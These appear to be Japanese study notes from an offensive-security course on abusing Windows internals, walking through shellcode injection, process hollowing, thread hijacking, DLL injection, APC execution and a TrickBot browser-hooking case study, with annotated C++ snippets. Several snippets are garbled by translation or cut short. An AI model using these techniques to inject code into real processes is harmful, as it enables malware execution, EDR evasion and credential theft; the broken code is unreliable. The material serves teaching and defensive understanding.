
## Intro

- Windows内部は、Windows OSの機能の中核をなすものであり、攻撃者はこれを悪用する。
- Windows内部は、コードの隠蔽や実行、検知の回避、他の技術やエクスプロイトとの連動に使用することができる
- Windows Internalという用語は、Windows OSのバックエンドで見られるあらゆるコンポーネントを包括する。これには、プロセス、ファイルフォーマット、COM（Component Object Model）、タスクスケジューリング、I/Oシステムなどが含まれることがある。
- ここでは、プロセスとそのコンポーネント、DLL（Dynamic Link Libraries）、PE（Portable Executable）フォーマットの悪用とエクスプロイトに焦点を当てる
- プロセスインジェクションは、多くの種類で使用できる包括的なテクニックであり、Windows内部を悪用する最も一般的なケースの1つ  
- ここで紹介するテクニックのほとんどは、一般的な市販のEDRで検出される

- ==以下はインジェクションの種類とそのコードの解説。==

## プロセスの悪用

- OS上で動作するアプリケーションには、1つまたは複数のプロセスが含まれることがある。
- プロセスは、実行されているプログラムを維持し、表現します。  
- プロセスは、他の多くのサブコンポーネントを持ち、メモリや仮想メモリと直接やりとりするため、ターゲットとして最適な候補となる。
- 以下の表は、プロセスの各重要コンポーネントとその目的について説明したもの

|Process Component|Purpose|
|---|---|
|Private Virtual Address Space|プロセスが割り当てられている仮想メモリアドレス。|
|Executable Program|仮想アドレス空間に格納されるコードとデータを定義する。|
|Open Handles|プロセスからアクセス可能なシステムリソースへのハンドルを定義する。|
|Security Context|アクセストークンは、ユーザ、セキュリティグループ、権限、その他のセキュリティ情報を定義する。|
|Process ID|プロセスのユニークな数値識別子。|
|Threads|実行が予定されているプロセスのセクション。|
- プロセスについての詳細は[1. Windows Internal](1.%20Windows%20Internal.md#プロセス)

### プロセスインジェクション
- プロセスインジェクションは、一般的に、正規の機能やコンポーネントを介して悪意のあるコードをプロセスに注入することを表す包括的な用語。
- 以下の4種類のプロセスインジェクションを学ぶ

|Injection Type|Function|
|---|---|
|[Process Hollowing](https://attack.mitre.org/techniques/T1055/012/)|サスペンドされhollowed(空洞化)したターゲットプロセスにコードをインジェクトする|
|[Thread Execution Hijacking](https://attack.mitre.org/techniques/T1055/003/)|サスペンドされたターゲットスレッドにコードをインジェクトする|
|[Dynamic-link Library Injection](https://attack.mitre.org/techniques/T1055/001/)|DLLをプロセスメモリにインジェクトする|
|[Portable Executable Injection](https://attack.mitre.org/techniques/T1055/002/)|悪意のある機能を指すPEイメージをターゲットプロセスに自己注入する|
- その他 [MITRE T1055](https://attack.mitre.org/techniques/T1055/)

- プロセスインジェクションは、最も基本的なレベルでは、シェルコードインジェクションの形をとっている
- シェルコードインジェクションは、高いレベルで4つのステップに分けることができる：
	1. すべてのアクセス権を持つターゲットプロセスをオープンする。  
	2. ターゲットプロセスのメモリをシェルコード用に割り当てる。  
	3. ターゲットプロセス内の割り当てられたメモリにシェルコードを書き込む。  
	4. リモートスレッドを使用してシェルコードを実行する。

- また、WindowsのAPIコールがプロセスメモリとどのように相互作用するかを図示することで、ステップを分解することができる
![[Pasted image 20230618185529.png]]

1. 特別なパラメータを使用してターゲットプロセスを開く。`OpenProcess`は、コマンドライン経由で供給されるターゲット・プロセスを開くために使用
```cpp
processHandle = OpenProcess(
	PROCESS_ALL_ACCESS, // アクセス権を定義する
	FALSE, // ターゲットハンドルを継承しない
	DWORD(atoi(argv[1])) // コマンドライン引数で指定されたローカルプロセス 
);
```

2. シェルコードのバイトサイズにメモリを割り当てる。メモリの割り当ては`VirtualAllocEx`を使用。呼び出しの中で、`dwSize`パラメータは`sizeof`関数を使用して定義され、割り当てるシェルコードのバイト数を取得する
```cpp
remoteBuffer = VirtualAllocEx(
	processHandle, // オープンされたターゲットのプロセス
	NULL, 
	sizeof shellcode, // メモリ割り当ての領域サイズ
	(MEM_RESERVE | MEM_COMMIT), // 予約・コミットページ
	PAGE_EXECUTE_READWRITE // コミットしたページの実行と読み書きのアクセスを可能にする
);
```

3. 割り当てられたメモリ領域により、シェルコードを書き込むことができるようになったので、`WriteProcessMemory`を使用して、メモリ領域への書き込みをする
```cpp
WriteProcessMemory(
	processHandle, // オープンされたターゲットのプロセス
	remoteBuffer, // 割り当てられたメモリ領域
	shellcode, // 書き込むデータ
	sizeof shellcode, // データのバイトサイズ
	NULL
);
```

4. プロセスを制御できるようになり、悪意のあるコードがメモリに書き込まれるようになった。メモリ上に存在するシェルコードを実行するには、`CreateRemoteThread`を使用（スレッドはプロセスの実行を制御する)
```cpp
remoteThread = CreateRemoteThread(
	processHandle, // オープンされたターゲットのプロセス
	NULL, 
	0, // スタックのデフォルトサイズ
	(LPTHREAD_START_ROUTINE)remoteBuffer, // スレッドの開始アドレスへのポインタ
	NULL, 
	0, // 作成してすぐ実行
	NULL
);
```

- シェルコードインジェクションは、プロセスインジェクションの最も基本的な形。
- 次のトピックでは、Process Hollowingのために、これらのステップをどのように修正し、適応させることができるかを見ていく。

## Expanding Process Abuse

- 上記では、シェルコードインジェクションを使用して、正規のプロセスに悪意のあるコードを注入する方法についてだったが、ここでは、Process Hollowingを取り上げる。
- シェルコードインジェクションと同様に、この技術では、悪意のあるファイル全体をプロセスに注入する。これは、プロセスをHollowingまたはマッピング解除し、特定のPE（Portable Executable）データとセクションをプロセスに注入することで実現される
  
- 大まかにプロセスホロリングは、6つのステップになる
	1. サスペンド状態のターゲットプロセスを作成する。  
	2. 悪意のあるイメージを開く。  
	3. プロセスメモリから正規のコードのマッピングを解除する。  
	4. 悪意のあるコード用のメモリロケーションを割り当て、各セクションをアドレス空間に書き込む。  
	5. 悪意のあるコードのエントリポイントを設定する。  
	6. ターゲットプロセスをサスペンド状態から解除する。
- また、WindowsのAPIコールがプロセスメモリとどのように相互作用するかを図示することで、ステップを分解することができる
![[Pasted image 20230618204510.png]]


- `VirtualAlloc`を使用してローカルプロセスにメモリを割り当てる 。`GetFileSize`は、`dwSize`の悪意のあるイメージのサイズを取得するためにも使用される
```cpp
DWORD maliciousFileSize = GetFileSize(
```


3. メモリのマッピングを解除することで処理をHollowingする。マッピングを解除する前に、APIコールのパラメータを特定する。メモリ内のプロセスの位置とエントリポイントを特定する。CPUのレジスタ`EAX`（エントリポイント）と`EBX`（PEBロケーション）には、取得する必要のある情報が含まれており、これらは`GetThreadContext`を使用して見つける。両方のレジスタが見つかったら、`ReadProcessMemory`を使用して、`EBX`からベースアドレスを取得し、PEBを調べて得られたオフセット（`0x8`）を加える
```cpp
c.ContextFlags = CONTEXT_INTEGER; // CPUレジスタのみをポインタに格納

	&pTargetImageBaseAddress, // ターゲットベースアドレスを保持
	sizeof(PVOID), // 読み出すバイト数
	0 // バイトアウト数
);
```

## Process Componentsの悪用
- スレッド（実行）ハイジャックは、高いレベルで10のステップに分けることができる

1. 制御対象のプロセスを探し出し、オープンする。 
2. 悪意のあるコード用にメモリ領域を割り当てる
3. 割り当てられたメモリに悪意のあるコードを書き込む。  
4. 乗っ取り対象のスレッドIDを特定する。  
5. 対象のスレッドをオープンする。  
6. 対象のスレッドを一時停止する。  
7. スレッドコンテキストを取得する。  
8. 命令ポインタを悪意のあるコードに更新する。  
9. 対象のスレッドコンテキストを書き換える。  
10. 乗っ取られたスレッドを再開する。

- 基本的なスレッドハイジャックスクリプトを分解して各ステップを確認し、以下でより深く解説していく
  
- このテクニックで説明する最初の3つのステップは、通常のプロセスインジェクションと同じ一般的なステップを踏んでいる。これらの説明は省略し、代わりに以下に文書化されたソースコードを掲載
```cpp
HANDLE hProcess = OpenProcess()  
PROCESS_ALL_ACCESS, // 可能なすべてのアクセス権を要求する。  
FALSE, // 子プロセスは、親プロセスのハンドルを継承しない。  
processId // ストアされたプロセスID  
);  
PVOIF remoteBuffer = VirtualAllocEx()  
hProcess, // 開いたターゲットプロセス  
NULL、  
sizeof shellcode, // メモリ割り当ての領域サイズ  
(MEM_RESERVE | MEM_COMMIT), // ページの予約とコミット  
PAGE_EXECUTE_READWRITE // 実行とコミットしたページへの読み書きアクセスを有効にする。  
);  
WriteProcessMemory(  
processHandle, // オープンしたターゲットプロセス  
remoteBuffer, // 割り当てられたメモリ領域  
shellcode, // 書き込むデータ  
sizeof shellcode, // データのバイトサイズ  
NULL  
);
```
4. 最初のステップが終わり、シェルコードがメモリに書き込まれたら、ステップ 4 に進む。ステップ4では、スレッドIDを特定することで、プロセススレッドをハイジャックするプロセスを開始する。スレッドIDを特定するには、3つのWindows APIコールを使用する`CreateToolhelp32Snapshot()`、`Thread32First()`、`Thread32Next()`。これらのAPIコールは、まとめてプロセスのスナップショットをループし、プロセス情報を列挙する機能を拡張する
```cpp
THREADENTRY32 threadEntry；  
  
HANDLE hSnapshot = CreateToolhelp32Snapshot( // 特定されたプロセスをスナップショットする。  
TH32CS_SNAPTHREAD, // システム上に存在するすべてのプロセスを含む。  
0 // 現在のプロセスを示す  
);  
Thread32First( // スナップショット内の最初のスレッドを取得する。  
hSnapshot, // スナップショットのハンドル  
&threadEntry // THREADENTRY32構造体へのポインタ。  
);  
  
while (Thread32Next( // スナップショット内の次のスレッドを取得する。  
snapshot, // スナップショットのハンドル  
&threadEntry // THREADENTRY32構造体へのポインタ  
)){
```
5. 構造体ポインタに必要な情報をすべて集め、ターゲットスレッドを開くことができるようになった。スレッドを開くには、`THREADENTRY32`構造体ポインタを持つ`OpenThread`を使用
```cpp
if (threadEntry.th32OwnerProcessID == processID) // 両方の親プロセスIDが一致するか確認する。  
{  
HANDLE hThread = OpenThread()  
THREAD_ALL_ACCESS, // 可能なすべてのアクセス権を要求する。  
FALSE, // 子スレッドは親スレッドハンドルを継承しない  
threadEntry.th32ThreadID // THREADENTRY32構造体ポインタからスレッドIDを読み取る。  
);  
break；  
}
```
6. 開いたターゲットスレッドを中断する。スレッドを一時停止するには、`SuspendThread`を使用
```cpp
SuspendThread(hThread);
```
7. 今後のAPIコールで使用するスレッドコンテキストを取得する。これは、`GetThreadContext`を使用してポインターを保存することで実現
```cpp
CONTEXT コンテキスト；  
GetThreadContext(  
hThread, // スレッド用のハンドル  
&context // コンテキスト構造体を格納するためのポインタ  
);
```
8. RIP（Instruction Pointer Register）を上書きして、メモリの悪意のある領域を指すようにする。RIPは次のコード命令を決定するx64のレジスタ。このレジスタを上書きするために、RIPのスレッドコンテキストを更新
```cpp
context.Rip = (DWORD_PTR)remoteBuffer; // RIPを悪意のあるバッファの割り当てに向ける。
```
9. コンテキストが更新され、現在のスレッドコンテキストに更新する。これは、`SetThreadContext`とコンテキストのポインタを使用
```cpp
SetThreadContext(  
hThread, // スレッド用のハンドル  
&context // コンテキスト構造体へのポインタ  
);
```
10. ターゲットスレッドをサスペンド状態から解放することができる。これを実現するために、`ResumeThread`を使用する
```cpp
ResumeThread(  
hThread // スレッドのハンドル  
);
```

## DLLsの悪用

- DLLインジェクションは、おおまかに5つのステップに分けられる

1. インジェクションする対象のプロセスを探す
2. ターゲットプロセスをオープンする。  
3. 悪意のあるDLL用のメモリ領域を確保する。  
4. 割り当てられたメモリに悪意のあるDLLを書き込む。  
5. 悪意のあるDLLをロードして実行する。

1. ターゲットとなるスレッドの位置を特定する。スレッドは、3つのWindows APIコールを使用して、プロセスから見つける：`CreateToolhelp32Snapshot()`、`Process32First()`、`Process32Next()`
```cpp
DWORD getProcessId(const char *processName) {。  
HANDLE hSnapshot = CreateToolhelp32Snapshot( // 指定されたプロセスをスナップショットする。  
TH32CS_SNAPPROCESS, // システム上に存在するすべてのプロセスを含む。  
0 // 現在のプロセスを示す  
);  
if (hSnapshot) {  
PROCESSENTRY32 entry; // PROCESSENTRY32構造体へのポインタを追加する。  
entry.dwSize = sizeof(PROCESSENTRY32); // 構造体のバイトサイズを取得する。  
if (Process32First( // スナップショット内の最初のプロセスを取得する。  
hSnapshot, // スナップショットのハンドル  
&entry // PROCESSENTRY32構造体へのポインタ。  
)){  
を行う{。  
if (!strcmp( // 2つの文字列を比較し、プロセス名が一致するかどうかを判断する。  
entry.szExeFile, // PROCESSENTRY32 からの現在のプロセスの実行ファイル名。  
processName // 提供されたプロセス名  
)){  
return entry.th32ProcessID; // 一致したプロセスのプロセスID  
}  
} while (Process32Next( // スナップショット内の次のプロセスを取得する。  
hSnapshot, // スナップショットのハンドル名  
ントリ  
)); // PROCESSENTRY32構造体へのポインタ  
}  
}  
  
DWORD processId = getProcessId(processName); // 列挙されたプロセスIDを格納する。
```
2. PIDが列挙された後、プロセスをオープンする。これは、`GetModuleHandle`、`GetProcAddress`、または`OpenProcess`から可能
```cpp
HANDLE hProcess = OpenProcess()  
PROCESS_ALL_ACCESS, // 可能なすべてのアクセス権を要求する。  
FALSE, // 子プロセスは、親プロセスのハンドルを継承しない。  
processId // ストアされたプロセスID  
);
```
3. 提供された悪意のあるDLLが常駐するためのメモリを割り当てる。ほとんどのインジェクタと同様に、これは`VirtualAllocEx`を使用
```cpp
LPVOID dllAllocatedMemory = VirtualAllocEx()  
hProcess, // ターゲットプロセスのハンドル  
NULL、  
strlen(dllLibFullPath), // DLLパスの大きさ  
MEM_RESERVE｜MEM_COMMIT, // ページの予約・コミット  
PAGE_EXECUTE_READWRITE // コミットしたページの実行と読み書きを可能にする。  
);
```
4. 悪意のあるDLLを確保されたメモリ位置に書き込む。`WriteProcessMemory`を使用して、割り当てられた領域に書き込む
```cpp
WriteProcessMemory(  
hProcess, // 対象プロセスのハンドル名  
dllAllocatedMemory, // 割り当てられたメモリ領域  
dllLibFullPath, // 悪意のあるDLLへのパス  
strlen(dllLibFullPath) + 1, // 悪意のあるDLLのバイトサイズ  
NULL  
);
```
5. 悪意のあるDLLがメモリに書き込まれ、あとはロードして実行する。DLLをロードするには、`kernel32`からインポートされた`LoadLibrary`を使用する。ロードされると、`CreateRemoteThread`を使用して、`LoadLibrary`を開始関数としてメモリを実行する
```cpp
LPVOID loadLibrary = (LPVOID) GetProcAddress(  
GetModuleHandle("kernel32.dll"), // 呼び出しを含むモジュールのハンドル名  
"LoadLibraryA" // インポートするためのAPIコール  
);  
HANDLE remoteThreadHandler = CreateRemoteThread(  
hProcess, // ターゲットプロセスのハンドル  
NULL、  
0, // スタックの実行可能な状態からのデフォルトのサイズ  
(LPTHREAD_START_ROUTINE) loadLibrary, 開始関数へのポインタ  
dllAllocatedMemory, // 割り当てられたメモリー領域へのポインター  
0, // 作成後すぐに実行される  
NULL  
);
```

### 実行
- `dll-injector.exe [process_name] [malicious_dll]`

## メモリ実行の代替案

- 環境によっては、シェルコードの実行方法を変更する必要がある。
- API呼び出しにフックがあり、回避やフック解除ができない場合や、EDRがスレッドを監視している場合などに発生する
- ここまでは、主にローカル/リモートプロセスとの間でデータを割り当てたり書き込んだりする方法について見てきた。
- しかし、メモリのアーティファクトやIOC(Indicators of Compromise)を最小限に抑えようとする場合には、それほど重要ではないが、executionもインジェクション技術には欠かせないステップ。
- データの割り当てや書き込みとは異なり、executionには多くのオプションがある
  
- いままでは、主に`CreateThread`とそれに対応する`CreateRemoteThread`による実行を観察してきた
- ここでは、環境の状況に応じて使用できる他の3つの実行方法について説明する

### Invoking Function Pointers
- void関数ポインタは、タイプキャスティングのみに依存するメモリブロックの実行方法
- この手法は、ローカルに割り当てられたメモリでのみ実行可能だが、APIコールやその他のシステム機能には一切依存しない。
- 以下は void function pointer の最も一般的な形式だが、さらに分解してその構成要素を説明する
```cpp
((void(*)())addressPointer)();
```
- 関数ポインタ`(void(*)())`を作成する
- 割り当てられたメモリポインタまたはシェルコード配列を関数ポインタにキャストする`(<function pointer>)addressPointer)`。  
- 関数ポインタを呼び出してシェルコードを実行する`();`

- このテクニックは非常に特殊な使用例だが、必要なときには非常に回避的で役に立つ

### Asynchronous Procedure Calls
- 非同期プロシージャコール（APC）とは、特定のスレッドのコンテキストで非同期に実行される関数である。 
- APC関数は、`QueueUserAPC`を介してスレッドにキューイングされる。キューに入れられたAPC関数は、ソフトウェア割り込みが発生し、次にスレッドがスケジュールされたときに関数が実行される
- userland/user-modeアプリケーションがAPC関数をキューに入れるには、スレッドが"alertable state"である必要がある。alertable stateとは、スレッドが`WaitForSingleObject`や`Sleep`などのコールバックを待っている状態であることが必要
- APC関数がどのようなものかを理解したところで、悪意を持って使用する方法について見ていく。メモリの確保と書き込みに `VirtualAllocEx` と `WriteProcessMemory `を使用する
```cpp
QueueUserAPC(  
(PAPCFUNC)addressPointer, // winntで定義された割り当てられたメモリへのAPC関数ポインタ  
pinfo.hThread, // PROCESS_INFORMATION 構造体からのスレッドへのハンドル。  
(ulong_ptr)null  
);  
レジュームスレッド(  
pinfo.hThread // PROCESS_INFORMATION 構造体からのスレッドへのハンドル  
);  
WaitForSingleObject(  
pinfo.hThread, // PROCESS_INFORMATION構造体からのスレッドへのハンドル  
INFINITE // アラートが出るまで無限に待ちます。  
);
```
- この手法は、スレッド実行の代わりになるものだが、最近、detection engineeringの分野でも注目され、APCの悪用に対して特定のトラップが実装されつつある。直面する検知対策によっては、今でも有効な選択肢となり得る

### Section Manipulation
- マルウェアの研究でよく見られる手法に、PE（Portable Executable）とセクションの操作がある。
- PEフォーマットは、Windowsにおける実行ファイルの構造とフォーマットを定義している。
- 実行目的では、主にセクション、具体的には.`data`と`.text`に注目する。
- テーブルやセクションへのポインタも、データを実行するためによく使われる
- これらの技術は複雑なので、その基本原理だけ説明する
  
- セクション操作のテクニックを始めるには、PEダンプを取得する必要がある。PEダンプの取得は、DLLやその他の悪意のあるファイルを`xxd`に送り込んで行うのが一般的  
- 各手法の核心は、物理的な16進数データをPEデータに変換するために数学を使って移動すること
- 一般的に知られている手法としては、RVAエントリポイントの解析、セクションマッピング、再配置テーブルの解析がある

## Case Study in Browser Injection and Hooking

- プロセスインジェクションの意味を理解するために、TrickBotのTTP（戦術、技術、手順）を観察する　[SentinelLabs](https://www.sentinelone.com/labs/how-trickbot-malware-hooking-engine-targets-windows-10-browsers/)
  
- TrickBotは、よく知られたバンキングマルウェアであり、最近、金融クライムウェアの中で人気が再燃している。
- 今回観察するマルウェアの主な機能は、ブラウザのフッキング。
- ブラウザフッキングにより、マルウェアはAPIコールをフックし、クレデンシャルの傍受や窃取に利用する
  
- 分析を始めるにあたり、彼らがどのようにブラウザをターゲットにしているのかを見てみる。
- SentinelLabのリバースエンジニアリングから、`OpenProcess`が一般的なブラウザパスのハンドルを取得するために使用されていることは明らか（以下の逆アセンブルを参照）。
```wasm
push   eax
push   0
push   438h
call   ds:OpenProcess
mov    edi, eax
mov    [edp,hProcess], edi
test   edi, edi
jz     loc_100045EE
```
```wasm
push   offset Srch            ; "chrome.exe"
lea    eax, [ebp+pe.szExeFile]
...
mov    eax, ecx
push   offset aIexplore_exe   ; "iexplore.exe"
push   eax                    ; lpFirst
...
mov    eax, ecx
push   offset aFirefox_exe   ; "firefox.exe"
push   eax                    ; lpFirst
...
mov    eax, ecx
push   offset aMicrosoftedgec   ; "microsoftedgecp.exe"
...
```
- reflectiveインジェクションの現在のソースコードは不明だが、SentinelLabsはインジェクションの基本的なプログラムフローを以下のように概説している

1. ターゲットプロセスを開く、`OpenProcess`  
2. メモリの割り当て, `VirtualAllocEx`  
3. 関数を割り当てたメモリにコピーする, `WriteProcessMemory`  
4. `WriteProcessMemory`、シェルコードを割り当てられたメモリにコピーする。  
5. キャッシュをフラッシュして変更をコミットする,` FlushInstructionCache  `
6. リモートスレッドの作成(`RemoteThread`)  
7. `ResumeThread`または`RtlCreateUserThread`でスレッドを再開またはフォールバックして新しいユーザースレッドを作成する

- 注入されたTrickBotは、ステップ3でメモリにコピーされたフックインストーラ関数を呼び出す。インストーラ関数のPseudo-codeは、SentinelLabsによって以下のように提供されている

- 関数ポインタとして認識される
```cpp
relative_offset = myHook_function - *(_DWORD *)(original_function + 1) - 5;
v8 = (unsigned __int8)original_function[5];
trampoline_lpvoid = *(void **)(original_function + 1);
```
- 関数ポインタが定義されると、マルウェアはそれを使って`VirtualProtectEx`を使って関数のメモリ保護機能を変更する
```cpp
if ( VirtualProtectEx((HANDLE)0xFFFFFFFF, trampoline_lpvoid, v8, 0x40u, &flOldProtect) )
```
- この時点で、コードはファンクションポインタフッキングによるマルウェアのおかしなビジネスに変わってしまう。このコード部分はフックを書き換えて、opcode jumpを指すようにする
```cpp
v10 = *(_DWORD *)(original_function + 1);
v11 = (unsigned __int8)original_function[5] - (_DWORD)original_function - 0x47;
original_function[66] = 0xE9u;
*(_DWORD *)(original_function + 0x43) = v10 + v11;
write_hook_iter(v10, &jmp_32_bit_relative_offset_opcode, 5); // -> フックを手動で書き込む
```
- 一度フックすると、元のメモリープロテクトに機能を戻すことができる
```cpp
VirtualProtectEx(		// 元のプロテクト状態に戻す
		(HANDLE)0xFFFFFFFF,
		*(LPVOID *)(original_function + 1),
		(unsigned __int8)original_function[5],
		flOldProtect,
		&flOldProtect);
```
- 深く理解してなくても大丈夫
- TrickBotのフック機能の主なポイントは、reflective injectionを使用してブラウザプロセスに自身を注入し、注入された関数からAPIコールをフックすること
